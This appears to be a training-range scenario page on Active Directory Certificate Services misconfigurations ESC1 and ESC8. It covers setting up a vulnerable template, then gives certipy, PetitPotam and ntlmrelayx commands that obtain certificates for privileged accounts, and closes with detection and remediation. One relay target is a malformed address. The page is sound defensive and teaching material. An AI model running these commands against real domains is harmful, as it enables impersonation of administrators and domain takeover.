# Scenario 5 - AD CS: ESC1 and ESC8

| | |
|---|---|
| **MITRE ATT&CK** | T1649 - Steal or Forge Authentication Certificates; T1557.001 - AiTM: LLMNR/NBT-NS Poisoning and SMB Relay |
| **Toggles** | `misconfig.adcs_esc1`, `misconfig.adcs_esc8` |
| **Role** | `misconfig_adcs` |
| **Host** | `SRV-ADCS01` (Enterprise Root CA `CORP-Range-CA`) |
| **Foothold** | Any domain user (ESC1) / ability to coerce authentication (ESC8) |

## Objective

- **ESC1**: request a certificate on behalf of another user (including a
  Domain Admin) by supplying the subject in the CSR.
- **ESC8**: relay a coerced machine/user authentication over HTTP to the CA's
  web-enrollment endpoint to obtain a certificate for that account.

## Seeded configuration

- An Enterprise Root CA `CORP-Range-CA` is installed on `SRV-ADCS01`.
- **Web enrollment** is installed and reachable over HTTP (ESC8 enabler).
- An ESC1-style certificate template is created with:
  - Enrollee supplies subject (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`),
  - Client Authentication EKU,
  - Enroll rights for `Domain Users`.

> **Fails soft.** The template creation is version-sensitive. If the role logs
> a warning, create the template manually (below). The CA itself and the ESC8
> endpoint always install.

### Manual ESC1 template creation (fallback)

On `SRV-ADCS01`, open **certsrv.msc** -> *Certificate Templates* -> *Manage*:

1. Duplicate **User**.
2. *Compatibility*: Windows Server 2016 / Windows 10.
3. *General*: name it `RangeESC1`.
4. *Subject Name*: select **Supply in the request**.
5. *Extensions* -> *Application Policies*: ensure **Client Authentication**.
6. *Security*: grant **Domain Users** Read + Enroll.
7. Publish it on the CA (`certsrv.msc` -> *Certificate Templates* -> *New* ->
   *Certificate Template to Issue* -> `RangeESC1`).

## Attack walkthrough

### ESC1 (certificate for a privileged user)

```bash
# As any domain user, request a cert with an admin UPN in the subject.
certipy req -u eevans@corp.contoso.lab -p '<password>' \
  -ca CORP-Range-CA -template RangeESC1 \
  -upn aanderson@corp.contoso.lab -dc-ip 10.10.10.10

# Authenticate as the admin with the issued certificate.
certipy auth -pfx aanderson.pfx -dc-ip 10.10.10.10
# -> yields the NT hash / a TGT for aanderson
```

### ESC8 (relay to web enrollment)

```bash
# 1. Coerce SRV-ADCS01 (or a DC) to authenticate to Kali.
python3 PetitPotam.py <kali-ip> 10.10.10.10

# 2. Relay the NTLM auth to the CA's HTTP enrollment endpoint.
impacket-ntlmrelayx -t http://10.10.20.ca/CERTSRV/ \
  -smb2support --adcs --template DomainController
```

### BloodHound view

The engine reports `AD CS vulnerable template (ESC1-style)` and
`AD CS web enrollment exposed` when the CA and template objects are present in
the export.

## Detection

- **4886 / 4887** - Certificate Services received / issued a certificate.
- **Certipy/certreq** user-agent on the CA's IIS logs.
- **Sysmon 3** and **5145** named-pipe access for coercion (PetitPotam).
- An unusual `RequesterName` vs `SubjectAltName` mismatch in CA audit trails.

## Remediation

- Remove `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` from templates that also allow a
  Client Authentication EKU and non-admin enrollment.
- Require CA manager approval for sensitive templates and restrict enrollment
  with security groups, not `Domain Users`.
- Disable HTTP enrollment; require HTTPS + Extended Protection for
  Authentication (EPA) and disable NTLM on the CA web endpoints.
- Enable SMB signing and LDAP signing to blunt relay paths.

## References

- MITRE T1649, T1557.001
- "Certified Pre-Owned" (SpecterOps) - ESC1 and ESC8
